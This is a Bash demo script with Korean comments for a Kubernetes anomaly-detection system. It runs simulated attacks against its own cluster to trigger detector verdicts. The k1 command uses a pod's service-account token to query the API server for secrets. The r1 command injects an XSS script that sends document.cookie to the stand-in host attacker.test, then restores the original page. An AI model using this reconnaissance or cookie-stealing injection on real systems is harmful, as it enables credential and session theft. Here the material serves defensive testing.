#!/usr/bin/env bash
# DeepMesh 시연 스크립트 — 배경 트래픽 / k1(drop) / r1(relay)
#
# k8s-master에서 실행한다. 저장소를 pull 한 뒤:
#     bash scripts/demo.sh <명령>
#
# 명령:
#   live    배경 정상 트래픽 시작 (traffic-gen replicas=1)
#   quiet   배경 정상 트래픽 중지 (replicas=0)
#   k1      auth Pod가 Kubernetes API Server를 정찰 → DROP
#   r1      frontend 응답에 XSS 주입 → RELAY (끝나면 원본 복원)
#   clean   대시보드 초기화 (detection_event / stats_bucket / peer_benign_bucket truncate)
#   pods    서비스별 Pod 이름·IP·노드 출력
#   dash    대시보드 5분 요약 (판정 건수 / blockRate)
#
# 사이드카 컨테이너 이름은 reverse-proxy, 앱 컨테이너는 서비스명과 같다(frontend만 frontend).
set -u

NS=deepmesh
NODEPORT=30090
# 저장소 위치. 다른 곳이면 DEEPMESH_REPO로 덮어쓴다.
REPO="${DEEPMESH_REPO:-$HOME/deepmesh}"
DASH="http://192.168.56.10:${NODEPORT}"

bar() { printf '%s\n' "===================================================================="; }

# 서비스의 Running Pod 이름 (첫 번째)
podname() {
  kubectl -n "$NS" get pods -l "app=$1" --field-selector=status.phase=Running \
    -o jsonpath='{.items[0].metadata.name}' 2>/dev/null
}
podip() { kubectl -n "$NS" get pod "$1" -o jsonpath='{.status.podIP}' 2>/dev/null; }
# 사이드카 최근 로그
sidelog() { kubectl -n "$NS" logs "$1" -c reverse-proxy --since="${2:-30}s" 2>/dev/null; }

# ── 배경 트래픽 ──────────────────────────────────────────────────────────
cmd_live() {
  if ! kubectl -n "$NS" get deploy traffic-gen >/dev/null 2>&1; then
    echo "traffic-gen 배포 중..."
    kubectl apply -f "$REPO/k8s/traffic-gen/" || {
      echo "traffic-gen 매니페스트를 찾지 못했습니다. DEEPMESH_REPO를 확인하세요."
      return 1
    }
  fi
  kubectl -n "$NS" scale deploy/traffic-gen --replicas=1 >/dev/null
  echo "배경 정상 트래픽 시작 (traffic-gen replicas=1)"
}

cmd_quiet() {
  kubectl -n "$NS" scale deploy/traffic-gen --replicas=0 >/dev/null 2>&1
  echo "배경 정상 트래픽 중지 (replicas=0)"
}

# ── k1 — Kubernetes API Server 정찰 (DROP) ──────────────────────────────
cmd_k1() {
  local pod
  pod=$(podname auth-service)
  [ -z "$pod" ] && { echo "auth-service Pod가 없습니다."; return 1; }

  bar
  echo " k1 — auth Pod가 Kubernetes API Server를 정찰 (T1613, DROP)"
  bar
  echo "  침해 Pod: $pod"
  # 한 keep-alive 연결로 pods/secrets/version을 번갈아 8번 조회한다.
  # auth의 정상 트래픽은 mysql·응답뿐이라 apiserver:443은 학습에 없던 흐름 → DROP.
  kubectl -n "$NS" exec "$pod" -c auth-service -- sh -c '
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    AS="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT_HTTPS:-443}"
    set -- -sS -k --http1.1 -H "Authorization: Bearer $TOKEN"
    first=1
    for u in pods secrets version pods secrets version pods secrets; do
      case "$u" in
        version) URL="$AS/version" ;;
        *)       URL="$AS/api/v1/namespaces/'"$NS"'/$u" ;;
      esac
      if [ "$first" = 1 ]; then set -- "$@" -o /dev/null -w "%{http_code} " "$URL"; first=0
      else set -- "$@" --next -o /dev/null -w "%{http_code} " "$URL"; fi
    done
    echo "[k1] apiserver :443 codes: $(curl "$@" 2>/dev/null)"
  ' 2>&1 | sed 's/^/   /'

  sleep 3
  echo "── 사이드카 DROP 로그 ──"
  sidelog "$pod" 25 | grep -aE "DROP|이상 판정" | tail -5 | sed 's/^/   /'
  echo "  DROP 건수(최근 30초): $(sidelog "$pod" 30 | grep -ac DROP)"
}

# ── r1 — 응답 위조 XSS (RELAY) ──────────────────────────────────────────
cmd_r1() {
  local fe post feip W
  fe=$(podname frontend)
  post=$(podname post-service)
  [ -z "$fe" ] || [ -z "$post" ] && { echo "frontend/post-service Pod가 없습니다."; return 1; }
  feip=$(podip "$fe")
  W=/usr/share/nginx/html

  bar
  echo " r1 — frontend 응답 위조 XSS (T1565, RELAY)"
  bar
  echo "  침해 frontend Pod: $fe ($feip)"

  # (1) 이 Pod의 index.html 앞에 XSS를 끼운다. 원본은 index.html.orig로 백업.
  #     형제 Pod는 그대로라 응답이 달라져 교차 검증이 RELAY로 집행한다.
  kubectl -n "$NS" exec "$fe" -c frontend -- sh -c "
    test -f $W/index.html.orig || cp $W/index.html $W/index.html.orig
    printf '%s\n' '<script>/*r1*/new Image().src=\"//attacker.test/c?\"+document.cookie;</script>' > /tmp/xss
    cat /tmp/xss $W/index.html.orig > $W/index.html
    echo '   주입 확인:'; head -c 70 $W/index.html; echo" 2>&1 | sed 's/^/   /'

  # (2) post Pod에서 그 frontend Pod IP로 GET /을 한 연결에 8번 → 변조 응답이 egress로 관측됨.
  kubectl -n "$NS" exec "$post" -c post-service -- sh -c "
    set -- -s -o /dev/null
    k=0; while [ \$k -lt 8 ]; do set -- \"\$@\" http://$feip:80/; k=\$((k+1)); done
    curl \"\$@\"
    echo '[r1] GET / x8 (one conn) -> frontend 변조 응답'" 2>&1 | sed 's/^/   /'

  sleep 3
  echo "── 사이드카 RELAY 로그 (frontend) ──"
  sidelog "$fe" 25 | grep -aE "RELAY|이상 판정|응답" | tail -6 | sed 's/^/   /'
  echo "  RELAY 건수(최근 30초): $(sidelog "$fe" 30 | grep -ac RELAY)"

  # (3) 원본 복원 (net-zero)
  kubectl -n "$NS" exec "$fe" -c frontend -- sh -c "cp $W/index.html.orig $W/index.html && echo '   index.html 복원 완료'" 2>&1 | sed 's/^/   /'
}

# ── 대시보드 초기화 ─────────────────────────────────────────────────────
cmd_clean() {
  local pw
  pw=$(kubectl -n "$NS" get secret deepmesh-secret -o jsonpath='{.data.MYSQL_ROOT_PASSWORD}' 2>/dev/null | base64 -d 2>/dev/null)
  [ -z "$pw" ] && { echo "deepmesh-secret에서 MYSQL_ROOT_PASSWORD를 읽지 못했습니다."; return 1; }
  kubectl -n "$NS" exec mysql-0 -c mysql -- sh -c \
    "mysql -uroot -p'$pw' -e 'truncate dashboard_db.detection_event; truncate dashboard_db.stats_bucket; truncate dashboard_db.peer_benign_bucket;'" 2>/dev/null \
    && echo "대시보드 초기화 완료 (detection_event / stats_bucket / peer_benign_bucket)" \
    || echo "초기화 실패 — mysql-0 접속 또는 비밀번호를 확인하세요."
}

# ── 유틸 ────────────────────────────────────────────────────────────────
cmd_pods() {
  local s
  for s in auth-service post-service comment-service frontend; do
    echo "[$s]"
    kubectl -n "$NS" get pods -l "app=$s" \
      -o custom-columns=NAME:.metadata.name,IP:.status.podIP,NODE:.spec.nodeName --no-headers 2>/dev/null \
      | sed 's/^/  /'
  done
}

cmd_dash() {
  echo "대시보드 5분 요약:"
  curl -s "$DASH/dashboard/stats/summary?timeRange=5m" \
    | sed 's/,/,\n /g' | grep -E "Count|Rate|totalSequences" | sed 's/^/  /'
}

case "${1:-}" in
  live)  cmd_live ;;
  quiet) cmd_quiet ;;
  k1)    cmd_k1 ;;
  r1)    cmd_r1 ;;
  clean) cmd_clean ;;
  pods)  cmd_pods ;;
  dash)  cmd_dash ;;
  *)
    echo "사용법: bash scripts/demo.sh {live|quiet|k1|r1|clean|pods|dash}"
    exit 1
    ;;
esac
